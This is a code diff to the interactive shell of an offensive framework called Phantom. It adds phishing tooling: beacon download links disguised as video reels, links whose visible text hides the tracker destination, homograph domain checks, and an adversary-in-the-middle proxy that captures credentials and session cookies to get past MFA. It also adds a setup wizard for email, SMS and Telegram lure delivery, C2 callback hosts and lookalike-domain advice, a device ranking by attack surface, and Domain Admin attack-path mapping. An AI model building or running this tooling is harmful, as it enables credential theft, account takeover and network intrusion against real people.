@@ -887,7 +887,25 @@ class PhantomShell(cmd.Cmd):
           craft pixel [label]             1x1 tracking pixel (email opens)
           craft beacon [platform]         one-click beacon link disguised as
                                           a reel URL
-          craft hits <code>               every recorded hit/open/cred
+          craft beacon-player [platform]  upgraded: reel page plays a REAL video,
+                                          play click downloads the beacon
+                                          (stealth fallback if C2 is down)
+          craft real <real-url> [kind]    REAL first hop: a genuine YouTube/
+                                          Drive/Notion URL goes in the message,
+                                          the capture link goes INSIDE that
+                                          content (ipgrab|reel|beacon-player)
+          craft channels [url|code]       WHERE the destination can be hidden
+                                          (anchor text) and where the raw
+                                          domain is all the target reads
+          craft idn <domain>              Will a homograph/IDN domain actually
+                                          display as the brand? (punycode
+                                          verdict, with evidence)
+          craft aitm <login-url>          ENTERPRISE (opt-in): AiTM reverse
+                                          proxy — serves the REAL login page
+                                          and captures credentials AND the
+                                          session cookies (beats plain MFA)
+          craft hits <code>               every recorded hit/open/cred/session
+          craft sessions <code>           sessions taken by an AiTM mount
           craft wait <code> [secs]        live-wait for the target
         """
         from phantom.modules import craft as _craft
@@ -926,7 +944,7 @@ class PhantomShell(cmd.Cmd):
             self._print_lure(out, "Tracking pixel — zero-click: IP when rendered")
             console.print(f"\n  [cyan]HTML for email/page:[/]\n  {out.get('html', '')}")
         elif sub == "beacon":
-            platform = parts[1] if len(parts) > 1 else "android"
+            platform = parts[1] if len(parts) > 1 else "auto"
             out = _craft.craft_beacon(platform=platform)
             if "error" in out:
                 notifier.error(out["error"])
@@ -936,6 +954,124 @@ class PhantomShell(cmd.Cmd):
             console.print(f"  [dim]redirects to: {out.get('payload_url', '')}[/]")
             if out.get("hint"):
                 notifier.info(out["hint"])
+        elif sub == "beacon-player":
+            platform = parts[1] if len(parts) > 1 else "auto"
+            out = _craft.craft_beacon_player(platform=platform)
+            if "error" in out:
+                notifier.error(out["error"])
+                notifier.info(out.get("hint", ""))
+                return
+            self._print_lure(out, "Beacon player delivery (reel page, play-click beacon)")
+            console.print(f"  [dim]redirects to: {out.get('payload_url', '')}[/]")
+            if out.get("hint"):
+                notifier.info(out["hint"])
+        elif sub == "real":
+            args = parts[1:]
+            outer = args[0] if args else ""
+            inner = args[1] if len(args) > 1 else "ipgrab"
+            out = _craft.craft_real(outer_url=outer, inner=inner)
+            if "error" in out:
+                notifier.error(out["error"])
+                if out.get("hint"):
+                    notifier.info(out["hint"])
+                return
+            console.print(f"\n  [bold cyan]► Real first hop "
+                          f"({out.get('outer_host')} — {out.get('inner')})[/]")
+            console.print(f"  [bold]1) IN THE DM / EMAIL (real URL):[/] "
+                          f"{out.get('outer_url')}")
+            console.print(f"  [bold]2) INSIDE THE CONTENT:[/] "
+                          f"{out.get('inner_paste')}")
+            console.print(f"  [dim]tracker url: {out.get('inner_url')}[/]")
+            console.print(f"  [dim]where: {out.get('placement')}[/]")
+            if out.get("supports_anchor"):
+                console.print("  [green]this surface hides the destination: "
+                              "the target reads "
+                              f"{out.get('inner_display')}[/]")
+            else:
+                notifier.error(out.get("warning", ""))
+                console.print(f"  [dim]anchor-capable middle hops: "
+                              f"{', '.join(out.get('recommended_middle_hops', []))}[/]")
+            console.print(f"  [dim]code: {out.get('inner_code')} "
+                          f"(craft hits / craft wait)[/]")
+            console.print(f"\n  [bold]DM text:[/]\n    {out.get('dm_text')}")
+            console.print(f"\n  [bold]Email:[/] subject: "
+                          f"{out.get('email_subject')}")
+            body = str(out.get("email_body", "")).replace("\n", "\n    ")
+            console.print(f"    {body}")
+            if out.get("note"):
+                notifier.info(out["note"])
+        elif sub == "idn":
+            dom = parts[1] if len(parts) > 1 else ""
+            out = _craft.idn_verdict(dom)
+            if "error" in out:
+                notifier.error(out["error"])
+                return
+            console.print(f"\n  [bold cyan]► IDN verdict: "
+                          f"{out.get('domain')}[/]")
+            console.print(f"  scripts:  {', '.join(out.get('scripts') or [])}"
+                          f"  [dim](mixed: "
+                          f"{out.get('mixed_scripts')})[/]")
+            console.print(f"  punycode: {out.get('punycode')}")
+            console.print(f"  [bold]address bar shows:[/] "
+                          f"{out.get('displayed_in_address_bar')}")
+            (notifier.error if out.get("mixed_scripts") else notifier.info)(
+                out.get("verdict", ""))
+            console.print(f"\n  [dim]{out.get('free_alternative')}[/]")
+        elif sub == "channels":
+            arg1 = parts[1] if len(parts) > 1 else ""
+            if arg1.lower().startswith(("http://", "https://")):
+                matrix = _craft.channel_matrix(url=arg1)
+            else:
+                matrix = _craft.channel_matrix(code=arg1)
+            console.print("\n  [bold cyan]► Link rendering matrix[/]")
+            for name, row in (matrix.get("channels") or {}).items():
+                hides = row.get("hides_destination")
+                mark = ("[green]HIDES  [/]" if hides else "[red]VISIBLE[/]")
+                console.print(f"  {mark}  [bold]{name}[/] "
+                              f"[dim]({row.get('where')})[/]")
+                console.print(f"           [dim]paste: "
+                              f"{row.get('paste')}[/]")
+            mech = matrix.get("mechanisms") or {}
+            anchor = mech.get("anchor") or {}
+            rdr = mech.get("middle_hop_redirect") or {}
+            console.print("\n  [bold cyan]► Mechanism A — anchor (link text)[/]")
+            console.print(f"    works on: {', '.join(anchor.get('works_on', []))}")
+            console.print(f"    fails on: {', '.join(anchor.get('fails_on', []))}")
+            console.print(f"    cost: {anchor.get('cost')}")
+            console.print("\n  [bold cyan]► Mechanism B — real third-party "
+                          "domain in front[/]")
+            console.print(f"    works on: {rdr.get('works_on')}")
+            console.print(f"    paste: {rdr.get('paste')}")
+            console.print(f"    cost: {rdr.get('cost')}")
+            console.print(f"\n  [dim]{matrix.get('truth')}[/]")
+        elif sub == "aitm":
+            upstream = parts[1] if len(parts) > 1 else ""
+            out = _craft.craft_aitm(upstream)
+            if "error" in out:
+                notifier.error(out["error"])
+                if out.get("hint"):
+                    notifier.info(out["hint"])
+                return
+            self._print_lure(out, "AiTM relay (real login page, credentials + "
+                                  "session)")
+            console.print(f"  [dim]upstream: {out.get('upstream')}[/]")
+            if out.get("hint"):
+                notifier.info(out["hint"])
+        elif sub == "sessions":
+            code = parts[1] if len(parts) > 1 else ""
+            if not code:
+                notifier.error("Usage: craft sessions <code>")
+                return
+            data = _craft.craft_sessions(code)
+            rows = data.get("sessions") or []
+            if not rows:
+                notifier.info("No sessions captured for this code yet.")
+                return
+            console.print("\n  [bold cyan]► Captured sessions[/]")
+            for s in rows:
+                console.print(f"  [bold]{s.get('username') or '(no user)'}[/] "
+                              f"[dim]{s.get('ip')} {s.get('time')}[/]")
+                console.print(f"    cookies: {s.get('cookies')}")
         elif sub == "hits":
             code = parts[1] if len(parts) > 1 else ""
             if not code:
@@ -956,6 +1092,15 @@ class PhantomShell(cmd.Cmd):
     def _print_lure(self, out: dict, what: str):
         console.print(f"\n  [bold cyan]► {what}[/]")
         console.print(f"  [bold]READY TO PASTE:[/] {out.get('url', '')}")
+        m = out.get("masked") or {}
+        if m:
+            # the SAME lure with the visible text swapped for a plausible
+            # platform share URL — the destination stays the tracker
+            console.print("  [bold]MASKED (link shows a reel URL, goes to the tracker):[/]")
+            console.print(f"    telegram/html : {m.get('telegram_html', '')}")
+            console.print(f"    discord       : {m.get('discord_markdown', '')}")
+            console.print(f"    email anchor  : {m.get('email_anchor', '')}")
+            console.print(f"    [dim]{m.get('note', '')}[/]")
         console.print(f"  [dim]code: {out.get('code', '')} | tracker: {out.get('base', '')}[/]")
         console.print("  [dim]watch it with: craft wait <code> | craft hits <code>[/]")
 
@@ -963,7 +1108,8 @@ class PhantomShell(cmd.Cmd):
         hits = data.get("hits") or []
         opens = data.get("opens") or []
         creds = data.get("creds") or []
-        if not (hits or opens or creds):
+        sessions = data.get("sessions") or []
+        if not (hits or opens or creds or sessions):
             notifier.info("No hits yet — the lure is live and waiting.")
             return
         for h in hits:
@@ -976,19 +1122,30 @@ class PhantomShell(cmd.Cmd):
         for c in creds:
             console.print(f"  [magenta]◈ CREDS[/] {c['ip']}  "
                           f"{c['username']}:{c['password']}")
+        for s in sessions:
+            # an AiTM session outlives the credentials: the cookies ARE the
+            # logged-in browser, MFA already satisfied
+            console.print(f"  [bright_magenta]⛨ SESSION[/] {s['ip']}  "
+                          f"{s.get('username') or '(no user)'}")
         notifier.success(
-            f"{len(hits)} hit(s) · {len(opens)} open(s) · {len(creds)} cred(s)")
+            f"{len(hits)} hit(s) · {len(opens)} open(s) · "
+            f"{len(creds)} cred(s) · {len(sessions)} session(s)")
 
     def do_map(self, arg: str):
         """map [cidr] — discover live hosts on the local network (or the
         given CIDR), feed the network map + WorldModel, then rank every
         device by reachable attack surface and suggest where to start."""
         from phantom.core.netmap import (
-            discover_network, seed_worldmodel, recommend_starting_target)
+            discover_network, seed_worldmodel, recommend_starting_target,
+            check_hosts_alive)
         target = arg.strip() or None
         notifier.status("Mapping the network... (arp-scan → nmap -sn → ping)")
         res = discover_network(target=target)
         hosts = res.get("hosts") or []
+        # live/dead status: the discovery only answers for hosts that are
+        # up NOW, so every freshly found device is alive — the liveness
+        # pass matters for hosts kept from earlier scans/ARP cache
+        check_hosts_alive(hosts, force=True)
         seed_worldmodel(hosts)
         if not hosts:
             notifier.warn(f"No live hosts found ({res.get('method')}).")
@@ -1001,12 +1158,15 @@ class PhantomShell(cmd.Cmd):
                           f"— {topo.get('note', '')}[/]")
         console.print(f"[bold cyan]Devices on the network ({res.get('method')}, "
                       f"{res.get('elapsed')}s):[/]")
-        console.print(f"  {'IP':<17}{'HOSTNAME':<24}{'OS GUESS':<17}SERVICES / PORTS")
+        console.print(f"  {'':1}{'IP':<16}{'HOSTNAME':<24}{'OS GUESS':<17}SERVICES / PORTS")
         for h in hosts:
             os_g = h.get("os_guess", "") or "—"
             svc = h.get("services") or ("-" if not h.get("ports") else "closed")
             name = (h.get("hostname") or "-")[:23]
-            console.print(f"  {h.get('ip', ''):<17}{name:<24}{os_g:<17}{svc}")
+            live = h.get("alive", True)
+            mark = "[green]●[/]" if live else "[dim]○[/]"
+            suffix = "" if live else " [dim](offline)[/]"
+            console.print(f"  {mark} {h.get('ip', ''):<15}{name:<24}{os_g:<17}{svc}{suffix}")
         # exposure ranking: quick TCP probe of common ports on every device
         notifier.status("Ranking devices by attack surface (TCP probe, "
                         "bounded)...")
@@ -1014,7 +1174,7 @@ class PhantomShell(cmd.Cmd):
         ranked = verdict.get("ranked") or []
         if ranked:
             console.print()
-            console.print("[bold yellow]── Most exposed devices ──[/]")
+            console.print("[bold yellow]── Most exposed devices (live only) ──[/]")
             console.print(f"  {'IP':<18}{'RISK':<9}{'SCORE':<7}OPEN PORTS")
             for r in ranked[:8]:
                 ports = ", ".join(f"{p['port']}/{p['service']}"
@@ -1032,8 +1192,12 @@ class PhantomShell(cmd.Cmd):
                               f"set target {rec.get('ip')} → use scan → run[/]")
         else:
             console.print(f"[dim]  {verdict.get('reason', 'No exposed services.')}[/]")
-        notifier.success(f"{len(hosts)} device(s) found — see them on the "
-                         "network map (Electron) or in the WorldModel.")
+        dead = sum(1 for h in hosts if not h.get("alive", True))
+        note = f"{len(hosts)} device(s) found"
+        if dead:
+            note += f" ({dead} offline, shown faded — powered-off devices are never ranked as targets)"
+        notifier.success(note + " — see them on the network map (Electron) "
+                         "or in the WorldModel.")
 
     def do_install(self, arg: str):
         """install <tool> — install a missing tool in the current backend
@@ -1688,6 +1852,7 @@ class PhantomShell(cmd.Cmd):
         t1.add_row("set lport <port>", "Set local port for callbacks")
         t1.add_row("show session", "Display current session info")
         t1.add_row("config [status|rotate-api-token]", "Auto-generated C2 secrets & mTLS status")
+        t1.add_row("setup [status|auto]", "Zero-config wizard: detect transports, write data/config.json")
         t1.add_row("note \"text\"", "Add a timestamped note")
         t1.add_row("notes", "Display all session notes")
         t1.add_row("history", "Show command history")
@@ -1715,6 +1880,7 @@ class PhantomShell(cmd.Cmd):
         t2b.add_row("map [cidr]", "Discover live hosts on the network and feed the WorldModel")
         t2b.add_row("install <tool>", "Install a missing tool (apt/brew/choco/pip, auto-selected)")
         t2b.add_row("wordlists list|use|search|info", "Manage attack dictionaries (rockyou, seclists, custom)")
+        t2b.add_row("ad tree|paths|add-user|add-dc|add-edge|reset", "BloodHound-style AD graph: ingest auto-mode data + manual nodes, shortest paths to Domain Admin")
 
         # ── Persistence ─────────────────────────────────────────────────
         t3 = Table(title="[bold white]Persistence & Reporting[/]", border_style="yellow", show_lines=False)
@@ -1749,7 +1915,6 @@ class PhantomShell(cmd.Cmd):
         t4.add_row("wordlist", "Wordlist Generator & Manager (see: wordlists list)")
         t4.add_row("report", "Report Generation (JSON, PDF, HTML)")
         t4.add_row("c2", "Command & Control Operations Center")
-
         console.print()
         console.print(t1)
         console.print()
@@ -1762,6 +1927,7 @@ class PhantomShell(cmd.Cmd):
         console.print(t4)
         console.print()
         console.print("[dim]  Type 'help <command>' for details on a specific command.[/]")
+        console.print("[dim]  Type 'ad paths' for Domain Admin attack paths — 'help ad' for the full AD syntax.[/]")
         console.print("[dim]  Type 'wordlists list' to manage attack dictionaries.[/]")
         console.print()
         try:
@@ -1809,6 +1975,183 @@ class PhantomShell(cmd.Cmd):
         notifier.info("Secrets live in data/phantom_state.json (gitignored). "
                       "Env vars override persisted values.")
 
+    def do_setup(self, arg: str):
+        """setup [status|auto] - Detect transports, configure optional channels
+        interactively and write data/config.json (no .env editing needed).
+
+        'status'  -> just print which channels are usable right now
+        'auto'    -> create data/config.json with defaults, no prompts
+        (no arg)  -> interactive wizard for the channels that are missing
+        """
+        from rich.table import Table
+        from phantom.automation.social.transports import transport_status
+        from phantom.utils import config as cfg
+
+        action = arg.strip().lower()
+        if action == "auto":
+            cfg.save_config({})
+            notifier.success(f"Config defaults written to {cfg.config_path()} "
+                             "— zero-config mode ready (local lab + C2).")
+            self._print_transport_status(transport_status())
+            return
+        if action == "status":
+            self._print_transport_status(transport_status())
+            console.print()
+            self._print_sandbox_status()
+            console.print()
+            self._print_toolbelt_status()
+            notifier.info("Run 'setup' to configure the missing channels, "
+                          "or 'setup auto' for defaults only.")
+            return
+
+        status = transport_status()
+        self._print_transport_status(status)
+        console.print()
+        notifier.info("Configure the optional external channels "
+                      "(leave blank to keep current / skip).")
+
+        def _ask(key: str, label: str, env: str, default: str = "") -> str:
+            cur = str(cfg.get(key, "", env=env) or "")
+            shown = cur or default          # detected suggestion, editable
+            try:
+                v = input(f"  {label} [{shown}]: ").strip()
+            except (EOFError, KeyboardInterrupt):
+                print()
+                return cur
+            if not v:
+                if not cur and default:
+                    cfg.set(key, default)   # accept the detected value
+                    return default
+                return cur
+            cfg.set(key, v)
+            return v
+
+        def _yn(prompt: str) -> bool:
+            try:
+                v = input(f"  {prompt} [y/N]: ").strip().lower()
+            except (EOFError, KeyboardInterrupt):
+                print()
+                return False
+            return v in ("y", "yes")
+
+        console.print("[bold cyan]-- Email (phishing / email-to-SMS) --[/]")
+        _ask("transports.smtp.host", "SMTP host", "PHANTOM_SMTP_HOST")
+        _ask("transports.smtp.port", "SMTP port", "PHANTOM_SMTP_PORT")
+        _ask("transports.smtp.username", "SMTP username", "PHANTOM_SMTP_USER")
+        _ask("transports.smtp.password", "SMTP password", "PHANTOM_SMTP_PASSWORD")
+        console.print("[bold cyan]-- SMS (email-to-SMS carrier) --[/]")
+        _ask("transports.sms_carrier", "Carrier (verizon|att|tmobile|...)",
+             "PHANTOM_SMS_CARRIER")
+        console.print("[bold cyan]-- DM (Telegram / Discord / custom) --[/]")
+        _ask("transports.telegram_bot_token", "Telegram bot token",
+             "PHANTOM_TELEGRAM_BOT_TOKEN")
+        _ask("transports.discord_webhook", "Discord webhook URL",
+             "PHANTOM_DISCORD_WEBHOOK")
+        console.print("[bold cyan]-- C2 callback address --[/]")
+        # This is the address embedded in the BEACON and in the dropper's
+        # payload URL: it must be reachable BY THE TARGET, never loopback.
+        notifier.info("Address the beacon calls back to (public IP or your "
+                      "domain). Leave blank to auto-detect; set it whenever "
+                      "the target is not on your LAN — with 127.0.0.1 the "
+                      "beacon dials itself and the dropper link is dead.")
+        _ask("c2.host", "C2 host for the beacon (public IP or domain)",
+             "PHANTOM_C2_HOST")
+        console.print("[bold cyan]-- Tracker / lure delivery --[/]")
+        # OPSEC: this is the URL a VICTIM and any SOC analyst will read in
+        # the lure. A raw IP (LAN or public) exposes the operator's box and
+        # screams "attack" — a DOMAIN with TLS is the only real answer.
+        notifier.info("This URL ends up in the victim's mail headers. Prefer "
+                      "a lookalike DOMAIN with TLS (the domain IS the "
+                      "camouflage for a reel/short link); a bare IP is "
+                      "readable and looks like an attack. Leave blank for "
+                      "lab-only (real lure delivery stays blocked).")
+        _ask("tracker.public_url",
+             "Public tracker URL (e.g. https://ig-video-cdn.net)",
+             "PHANTOM_TRACK_URL")
+        try:
+            from phantom.automation.social.tracker import (
+                tracker_opsec_warnings,
+            )
+            for _w in tracker_opsec_warnings():
+                notifier.warn(_w)
+        except Exception:
+            pass
+        console.print("[bold cyan]-- Breach lookup --[/]")
+        _ask("breach.hibp_api_key", "HIBP API key (optional)",
+             "PHANTOM_HIBP_API_KEY")
+        _ask("breach.custom_api", "Custom breach API base URL (optional)",
+             "PHANTOM_BREACH_API")
+        console.print("[bold cyan]-- Payload sandbox / AV validation --[/]")
+        notifier.info("Optional: multi-engine + VM detonation makes the payload "
+                      "gate stronger (ClamAV/YARA run when installed).")
+        _ask("sandbox.yara_rules", "YARA rules file or directory",
+             "PHANTOM_YARA_RULES")
+        _ask("sandbox.vm_exec", "VM exec wrapper (e.g. ssh user@vm)",
+             "PHANTOM_SANDBOX_VM_EXEC")
+        _ask("sandbox.vm_copy", "VM copy command (e.g. scp -i key {local} {remote})",
+             "PHANTOM_SANDBOX_VM_COPY")
+        _ask("sandbox.vm_edr", "EDR/AV running in the VM (label, e.g. CrowdStrike)",
+             "PHANTOM_SANDBOX_VM_EDR")
+        console.print("[bold cyan]-- Engagement gates --[/]")
+        if _yn("Allow unscoped commands (lab/CTF only)"):
+            cfg.set("engagement.allow_unscoped", True)
+        if _yn("Allow ransomware simulation (scratch dirs only)"):
+            cfg.set("engagement.ransom_sim_allow", True)
+
+        cfg.reload_config()
+        console.print()
+        notifier.success(f"Config saved to {cfg.config_path()}")
+        self._print_transport_status(transport_status())
+        console.print()
+        self._print_sandbox_status()
+
+    @staticmethod
+    def _print_sandbox_status():
+        """Which sandbox engines are usable (drives what 'approved' proves)."""
+        from rich.table import Table
+        from phantom.automation.sandbox.sandbox import sandbox_status
+        table = Table(title="[bold]Payload Sandbox Engines[/]", border_style="cyan")
+        table.add_column("Engine", style="cyan", no_wrap=True)
+        table.add_column("Status", style="white")
+        table.add_column("Sample kinds", style="dim")
+        for st in sandbox_status():
+            mark = "[green]ready[/]" if st["ready"] else "[yellow]missing[/]"
+            table.add_row(st["engine"], mark, st["kinds"])
+        console.print(table)
+        notifier.info("Install clamscan/yara or set PHANTOM_SANDBOX_VM_EXEC to "
+                      "raise the gate from one engine to multi-engine + VM.")
+
+    @staticmethod
+    def _print_transport_status(status: dict):
+        from rich.table import Table
+        table = Table(title="[bold]Transport Capability[/]", border_style="cyan")
+        table.add_column("Channel", style="cyan", no_wrap=True)
+        table.add_column("Status", style="white")
+        table.add_column("Detail / how to enable", style="dim")
+        for name, st in status.items():
+            mark = "[green]ready[/]" if st.get("ready") else "[yellow]missing[/]"
+            table.add_row(name, mark, st.get("detail", ""))
+        console.print(table)
+
+    def _print_toolbelt_status():
+        from rich.table import Table
+        from phantom.automation.brain.toolbelt import Toolbelt
+        tb = Toolbelt()
+        table = Table(title="[bold]Tool Capability (multi-tool per capability)[/]",
+                      border_style="cyan")
+        table.add_column("Capability", style="cyan", no_wrap=True)
+        table.add_column("Selected tool", style="white")
+        table.add_column("Missing alternatives", style="dim")
+        for cap, ch in tb.status().items():
+            tool = ("[green]" + ch.tool + "[/]" if ch.ok
+                    else "[yellow]none[/]")
+            if ch.tool == "__internal__":
+                tool = "[green]built-in engine[/] (no binary needed)"
+            table.add_row(cap, tool,
+                          (", ".join(ch.alternatives_missing) or "—")
+                          + ("" if ch.ok else f" · {ch.reason[:60]}"))
+        console.print(table)
+
     def do_back(self, arg: str):
         """Return to main shell (already here)"""
         notifier.warn("Already at main shell.")
@@ -1823,6 +2166,109 @@ class PhantomShell(cmd.Cmd):
         """malleable [show|save|recommend] - Manage malleable C2 profiles for beacon stealth"""
         from phantom.utils.malleable import handle_malleable_command
         handle_malleable_command(arg)
+
+    def do_ad(self, arg: str):
+        """ad [tree|paths|add-user <u> [opts]|add-edge <src> <type> <dst>|reset]
+            - BloodHound-style AD attack graph from session knowledge.
+
+        subcommands:
+          (none) | tree      render the domain graph + attack paths
+          paths              only the attack paths to Domain Admin
+          add-user <u>       register a user; flags: --kerberoastable
+                             --as-rep --cracked --admin-to <host>
+                             --session-on <host> --group <g>
+          add-edge <s> <t> <d>  raw edge (member_of/admin_to/session/owns)
+          add-dc <host>      register the domain controller
+          reset              clear the graph (new engagement)"""
+        from phantom.core.ad_graph import ADGraph, EDGE_TYPES
+        from phantom.core.knowledge import session_wm
+        g = ADGraph()
+        # ingest whatever the session already knows (idempotent)
+        try:
+            from phantom.core.ad_graph import ingest_from_wm
+            g = ingest_from_wm(session_wm())
+        except Exception:
+            pass
+        parts = arg.strip().split()
+        sub = parts[0].lower() if parts else "tree"
+
+        if sub in ("", "tree"):
+            for line in g.ascii_tree():
+                notifier.info(line)
+            return
+        if sub == "paths":
+            paths = g.paths_to("DA")
+            if not paths:
+                notifier.warn("No attack paths to DA known yet — collect "
+                              "more AD data (add-user --kerberoastable, "
+                              "--session-on, --admin-to)")
+                return
+            for i, p in enumerate(paths, 1):
+                chain = " -> ".join(f"{s}[{t}]{d}" for s, t, d in p)
+                notifier.info(f"[{i}] {chain}")
+            return
+        if sub == "add-user":
+            if len(parts) < 2:
+                notifier.error("Usage: ad add-user <user> [--kerberoastable] "
+                               "[--as-rep] [--cracked] [--admin-to H] "
+                               "[--session-on H] [--group G]")
+                return
+            u = parts[1]
+            g.add_node(u, "user", label=u)
+            opts = parts[2:]
+            i = 0
+            while i < len(opts):
+                o = opts[i].lower()
+                if o == "--kerberoastable":
+                    g.nodes[u].props["kerberoastable"] = True
+                elif o == "--as-rep":
+                    g.nodes[u].props["as_rep_roastable"] = True
+                elif o == "--cracked":
+                    g.nodes[u].props["cracked"] = True
+                elif o in ("--admin-to", "--session-on") and i + 1 < len(opts):
+                    host = opts[i + 1]
+                    et = "admin_to" if o == "--admin-to" else "session"
+                    g.add_node(host, "computer")
+                    g.add_edge(u, host, et)
+                    i += 1
+                elif o == "--group" and i + 1 < len(opts):
+                    grp = opts[i + 1]
+                    g.add_node(grp, "group")
+                    g.add_edge(u, grp, "member_of")
+                    i += 1
+                i += 1
+            g._save()
+            notifier.success(f"AD user {u} recorded ({sum(len(v.props) for v in g.nodes.values())} graph nodes total)")
+            return
+        if sub == "add-dc":
+            if len(parts) < 2:
+                notifier.error("Usage: ad add-dc <host>")
+                return
+            g.add_node(parts[1], "dc", label="Domain Controller")
+            if g.domain:
+                g.add_edge(g.domain, parts[1], "owns")
+            g._save()
+            notifier.success(f"DC {parts[1]} recorded")
+            return
+        if sub == "add-edge":
+            if len(parts) < 4 or parts[2].lower() not in EDGE_TYPES:
+                notifier.error(f"Usage: ad add-edge <src> <{'|'.join(EDGE_TYPES)}> <dst>")
+                return
+            s, t, d = parts[1], parts[2].lower(), parts[3]
+            for nid, ntype in ((s, "user"), (d, "computer")):
+                if nid not in g.nodes:
+                    g.add_node(nid, ntype)
+            g.add_edge(s, d, t)
+            notifier.success(f"edge {s} -[{t}]-> {d} recorded")
+            return
+        if sub == "reset":
+            from phantom.core import ad_graph as _m
+            _m.STATE_PATH.unlink(missing_ok=True)
+            from phantom.core.ad_graph import ADGraph as _G
+            g2 = _G()
+            notifier.success("AD graph cleared")
+            return
+        notifier.error(f"Unknown ad subcommand: {sub}")
 
     def do_exit(self, arg: str):
         """exit - Exit Phantom, optionally save current session and generate professional report"""
